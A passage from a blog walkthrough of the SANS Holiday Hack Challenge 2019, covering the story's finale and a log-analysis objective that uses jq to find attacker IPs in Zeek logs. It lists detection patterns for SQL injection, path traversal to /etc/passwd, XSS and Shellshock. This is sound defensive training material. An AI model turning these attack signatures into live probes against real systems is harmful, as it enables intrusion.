-s 172.19.0.225 –dport 22 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT<li>sudo iptables -A INPUT -p tcp –dport 21 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT<br /> sudo iptables -A INPUT -p tcp –dport 80 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT<li>sudo iptables -A OUTPUT -p tcp –dport 80 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT<li>sudo iptables -A INPUT -i lo -j ACCEPT</ol><h4 id="hint-3"><span class="mr-2">Hint</span><a href="#hint-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Oh thank you! It’s so nice to be back in my own head again. Er, alone.<br /> By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.<br /> There are funny rhymes, references to perspective, and odd mentions of eggs!<br /> And if you think the stuff in your browser looks strange, you should see the page source…<br /> Special tools? No, I don’t think you’ll need any extra tooling for those locks.<br /> BUT – I’m pretty sure you’ll need to use Chrome’s developer tools for that one.<br /> Or sorry, you’re a Firefox fan?<br /> Yeah, Safari’s fine too – I just have an ineffible hunger for a physical Esc key.<br /> Edge? That’s cool. Hm? No no, I was thinking of an unrelated thing.<br /> Curl fan? Right on! Just remember: the Windows one doesn’t like double quotes.<br /> Old school, huh? Oh sure – I’ve got what you need right here…</p><h3 id="the-tooth-fairy-and-sleigh-shop"><span class="mr-2">The Tooth Fairy and Sleigh Shop</span><a href="#the-tooth-fairy-and-sleigh-shop" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><a href="/assets/img/2020/01/image-48.png"><img data-src="/assets/img/2020/01/image-48-1024x548.png" data-proofer-ignore></a></p><blockquote class="wp-block-quote"><p> I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season.<br />I hate how Santa is so beloved, but only works one day per year!<br />He has all of the resources of the North Pole and the elves to help him too.<br />I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children.<br />But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us!<br />But, although you found me, you haven’t foiled my plot!<br />Santa’s sleigh will NOT be able to find its way.<br />I will get my revenge and respect!<br />I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!!</p><cite>Tooth Fairy</cite></blockquote><p>Upon entering the Sleigh Shop, you’ll see the mastermind Tooth Fairy and can find out why she sabotaged Christmas. Also you get access to the sleigh guidance system.</p><h2 id="objective-12--filter-out-poisoned-sources-of-weather-data"><span class="mr-2">Objective 12 – Filter Out Poisoned Sources of Weather Data</span><a href="#objective-12--filter-out-poisoned-sources-of-weather-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Use the data supplied in the <a href="https://downloads.elfu.org/http.log.gz">Zeek JSON logs</a> to identify the IP addresses of attackers poisoning Santa’s flight mapping software. <a href="https://srf.elfu.org/">Block the 100 offending sources of information to guide Santa’s sleigh</a> through the attack. Submit the Route ID (“RID”) success value that you’re given. _For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.</p></blockquote><p>Clicking on the computer for the Sleigh Route Finder opens your browser to their guidance app. Credentials given earlier do nothing with this system, so you have to find the proper login to get further. Also, there are hints to get from Wunorse Openslae by his Terminal Challenge.</p><h3 id="terminal-challenge--zeek-json-analysis"><span class="mr-2">Terminal Challenge – Zeek JSON Analysis</span><a href="#terminal-challenge--zeek-json-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> Wunorse Openslae here, just looking at some Zeek logs.<br />I&#8217;m pretty sure one of these connections is a malicious C2 channel&#8230;<br />Do you think you could take a look?<br />I hear a lot of C2 channels have very long connection times.<br />Please use <code>jq</code> to find the longest connection in this data set.<br />We have to kick out any and all grinchy activity!</p><cite>Wunorse Openslae</cite></blockquote><p><a href="/assets/img/2020/01/image-49.png"><img data-src="/assets/img/2020/01/image-49.png" data-proofer-ignore></a></p><p>All you have to do is use <code class="language-plaintext highlighter-rouge">jq -s 'max_by(.duration)' conn.log</code> to get the maximum and answer the question with the resp_h address.</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"ts"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2019-04-18T21:27:45.402479Z"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CmYAZn10sInxVD5WWd"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"id.orig_h"</span><span class="p">:</span><span class="w"> </span><span class="s2">"192.168.52.132"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"id.orig_p"</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w">
  </span><span class="nl">"id.resp_h"</span><span class="p">:</span><span class="w"> </span><span class="s2">"13.107.21.200"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"id.resp_p"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
  </span><span class="nl">"proto"</span><span class="p">:</span><span class="w"> </span><span class="s2">"icmp"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"duration"</span><span class="p">:</span><span class="w"> </span><span class="mf">1019365.337758</span><span class="p">,</span><span class="w">
  </span><span class="nl">"orig_bytes"</span><span class="p">:</span><span class="w"> </span><span class="mi">30781920</span><span class="p">,</span><span class="w">
  </span><span class="nl">"resp_bytes"</span><span class="p">:</span><span class="w"> </span><span class="mi">30382240</span><span class="p">,</span><span class="w">
  </span><span class="nl">"conn_state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"OTH"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"missed_bytes"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
  </span><span class="nl">"orig_pkts"</span><span class="p">:</span><span class="w"> </span><span class="mi">961935</span><span class="p">,</span><span class="w">
  </span><span class="nl">"orig_ip_bytes"</span><span class="p">:</span><span class="w"> </span><span class="mi">57716100</span><span class="p">,</span><span class="w">
  </span><span class="nl">"resp_pkts"</span><span class="p">:</span><span class="w"> </span><span class="mi">949445</span><span class="p">,</span><span class="w">
  </span><span class="nl">"resp_ip_bytes"</span><span class="p">:</span><span class="w"> </span><span class="mi">56966700</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h4 id="post-dialogue-with-hints"><span class="mr-2">Post Dialogue with Hints</span><a href="#post-dialogue-with-hints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote><p>That’s got to be the one - thanks!<br /> Hey, you know what? We’ve got a crisis here.<br /> You see, Santa’s flight route is planned by a complex set of machine learning algorithms which use available weather data.<br /> All the weather stations are reporting severe weather to Santa’s Sleigh. I think someone might be forging intentionally false weather data!<br /> I’m so flummoxed I can’t even remember how to login!<br /> Hmm… Maybe the Zeek http.log could help us.<br /> I worry about LFI, XSS, and SQLi in the Zeek log - oh my!<br /> And I’d be shocked if there weren’t some shell stuff in there too.<br /> I’ll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.<br /> If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.<br /> The sleigh’s machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.<br /> Try not to block many legitimate weather station IPs as that could also cause route calculation failure.<br /> Remember, when looking at JSON data, jq is the tool for you!</p></blockquote><h3 id="sleigh-route-finder-application"><span class="mr-2">Sleigh Route Finder Application</span><a href="#sleigh-route-finder-application" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The computer in the sleigh room brings up the <a href="https://srf.elfu.org/">Sleigh Route Finder</a> flight mapping app. The login is not provided so it will have to be discovered. Then use the hints gathered for solving Objective 12 within this app.</p><h4 id="login-credentials"><span class="mr-2">Login Credentials</span><a href="#login-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>There were some hints given about the login system:</p><ol><li>Kent Tinseltooth mentioned this system uses default credentials<li>This is the system pictured in the encrypted PDF from Objective 10<li>The PDF mentions the default credentials are in a ElfU Research Labs git repository</ol><p>With the above hints you know to look for default creds that are found in a git repo. The ‘http.log’ file given in the Objective Description has captured traffic from the mentioned git repo. Find the traffic with <code class="language-plaintext highlighter-rouge">cat http.log | jq '.[]' | grep -i 'readme'</code>. Then go to the address found and you’ll find the creds.</p><h4 id="hints-gathered-from-wunorse-openslae"><span class="mr-2">Hints gathered from Wunorse Openslae</span><a href="#hints-gathered-from-wunorse-openslae" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><ol><li>App is based on ML algorithms that consume weather data<li>Weather stations are sending bad data to corrupt the algorithm<li>Use the ‘http.log’ file<li>Look for Local File Includes<li>Look for Cross Site Scripting<li>Look for SQL injection<li>Look for Shell Shock Exploits<li>Block IP addresses from events found<li>Pivoting will be involved<li>Only most of the bad IPs need to be found (there are 100 according to Objective Description)<li>Use ‘jq’</ol><h4 id="sql-injection"><span class="mr-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>There are 29 SQLi events to find. Use these commands and note the originating host address:</p><ul><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | match("SELECT"))'</code><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(.username | contains("1=1"))'</code><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(.user_agent | tostring | match("SELECT"))'</code><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(.uri | tostring | match("SELECT"))'</code></ul><h4 id="local-file-includes"><span class="mr-2">Local File Includes</span><a href="#local-file-includes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>There are 11 events to find for LFI.</p><ul><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | contains("../.."))'</code><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | contains(".|./.|."))'</code><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | contains(".%2e/.%2e"))'</code><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | contains("/etc/passwd"))'</code></ul><h4 id="cross-site-scripting"><span class="mr-2">Cross Site Scripting</span><a href="#cross-site-scripting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>There are 16 XSS events to find.</p><ul><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | match("&lt;script&gt;";"i"))'</code></ul><h4 id="shellshock"><span class="mr-2">Shellshock</span><a href="#shellshock" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>There are 6 Shellshock events to find.</p><ul><li><code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(. | tostring | contains("};"))'</code></ul><h4 id="pivoting"><span class="mr-2">Pivoting</span><a href="#pivoting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>The extracted events found with the above queries will only get 62 addresses, and pivoting on the user-agent will be required to find the rest. There are several steps involved in the process.</p><ol><li>List all the addresses found so far and put them in a ‘jq’ query to find all the events. It could look like <code class="language-plaintext highlighter-rouge">cat http.log | jq '.[] | select(."id.orig_h" | contains("42.103.246.250") or contains("2.230.60.70") or contains("10.155.246.29") or contains("225.191.220.138") or contains("75.73.228.192") or contains("249.34.9.16") or contains("27.88.56.114") or contains("238.143.78.114") or contains("121.7.186.163") or contains("106.132.195.153") or contains("129.121.121.48") or contains("190.245.228.38") or contains("34.129.179.28") or contains("135.32.99.116") or contains("2.240.116.254") or contains("45.239.232.245") or contains("68.115.251.76") or contains("118.196.230.170") or contains("173.37.160.150") or contains("81.14.204.154") or contains("135.203.243.43") or contains("186.28.46.179") or contains("13.39.153.254") or contains("111.81.145.191") or contains("0.216.249.31") or contains("33.132.98.193") or contains("84.185.44.166") or contains("254.140.181.172") or contains("150.50.77.238") or contains("230.246.50.221") or contains("223.149.180.133") or contains("187.178.169.123") or contains("116.116.98.205") or contains("28.169.41.122") or contains("102.143.16.184") or contains("131.186.145.73") or contains("253.182.102.55") or contains("229.133.163.235") or contains("23.49.177.78") or contains("9.206.212.33") or contains("56.5.47.137") or contains("19.235.69.221") or contains("69.221.145.150") or contains("42.191.112.181") or contains("48.66.193.176") or contains("49.161.8.58") or contains("84.147.231.129") or contains("44.74.106.131") or contains("106.93.213.219") or contains("61.110.82.125") or contains("65.153.114.120") or contains("123.127.233.97") or contains("95.166.116.45") or contains("80.244.147.207") or contains("168.66.108.62") or contains("200.75.228.240") or contains("31.254.228.4") or contains("220.132.33.81") or contains("83.0.8.119") or contains("150.45.133.97") or contains("229.229.189.246") or contains("227.110.45.126"))'</code><li>Add “| .user_agent” at the end of the query in order to extract the user agents.<li>Weed out the user agents that are obviously malicious traffic and not really user agents.<li>Use a ‘jq’ command to figure out which addresses had which user agent.<li>Note the user agents with exactly two addresses each, there will be many.<li>One of the addresses in each group of two is already known to be bad, and the other is an additional bad actor that can be added to the list.</ol><p>The quick way to curate the final list is to extract each group of two and put in a spreadsheet with the original 62 addresses, then run a remove duplicates function on it. The final count should be 97. I don’t know what the final 3 are. Make the list comma separated and submit it to the SRF Firewall for the win!</p><blockquote><p><strong>Route Calculation Success! RID:0807198508261964</strong></p></blockquote><h2 id="wrapping-up"><span class="mr-2">Wrapping up</span><a href="#wrapping-up" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Once the Route ID has been submitted to pass the Objective, you have access to the Bell Tower. <a href="/assets/img/2020/01/2020-02-12-22-21-12.png"><img data-src="/assets/img/2020/01/2020-02-12-22-21-12.png" data-proofer-ignore></a></p><p>Where you’ll see Santa again, along with Krampus and the guilty Tooth Fairy. <a href="/assets/img/2020/01/2020-02-12-22-24-25.png"><img data-src="/assets/img/2020/01/2020-02-12-22-24-25.png" data-proofer-ignore></a></p><p>Santa’s final dialogue:</p><blockquote><p>You did it! Thank you! You uncovered the sinister plot to destroy the holiday season! Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays! Ho Ho Ho! The more I laugh, the more I fill with glee. And the more the glee, The more I’m a merrier me! Merry Christmas and Happy Holidays.</p></blockquote><p>Krampus’s final dialogue:</p><blockquote><p>Congratulations on a job well done! Oh, by the way, I won the Frido Sleigh contest. I got 31.8% of the prizes, though I’ll have to figure that out.</p></blockquote><p>Tooth Fairy’s final dialogue:</p><blockquote><p>You foiled my dastardly plan! I’m ruined! And I would have gotten away with it too, if it weren’t for you meddling kids!</p></blockquote><p>And in the corner, you’ll see a note on the ground.</p><blockquote><p>Thankfully, I didn’t have to implement my plan by myself! Jack Frost promised to use his wintry magic to help me subvert Santa’s horrible reign of holiday merriment NOW and FOREVER!<br /> –<cite>LetterOfWintryMagic</cite></p></blockquote><p>Seems next year we’ll have to contend with Ol’ Jack Frost!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/holidayhackchallenge/'>HolidayHackChallenge</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SANS Holiday Hack Challenge 2019 - MegaWattSec&amp;url=https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SANS Holiday Hack Challenge 2019 - MegaWattSec&amp;u=https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/&amp;text=SANS Holiday Hack Challenge 2019 - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/overthewire-natas-16/"><div class="card-body"> <em class="timeago small" data-ts="1568402533" > 2019-09-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 16 &#8211; 20</h3><div class="text-muted small"><p> LEVEL 16 This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let’s see the source: &amp;lt;form&amp;gt; Find words containing: &amp;lt;input ...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-21/"><div class="card-body"> <em class="timeago small" data-ts="1568659795" > 2019-09-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 21 &#8211; 25</h3><div class="text-muted small"><p> LEVEL 21 This level has a second site associated with it, where all the action is: Main Site PHP sourcecode of the main page: &amp;lt;? function print_credentials() { if($_SESSION and array...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-26/"><div class="card-body"> <em class="timeago small" data-ts="1568918412" > 2019-09-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 26 &#8211; 27</h3><div class="text-muted small"><p> LEVEL 26 The sourcecode: &amp;lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private $exitMsg; ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/hackthebox-craft/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox: Craft</p></a> <a href="/posts/HackTheBox-Registry/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox: Registry</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
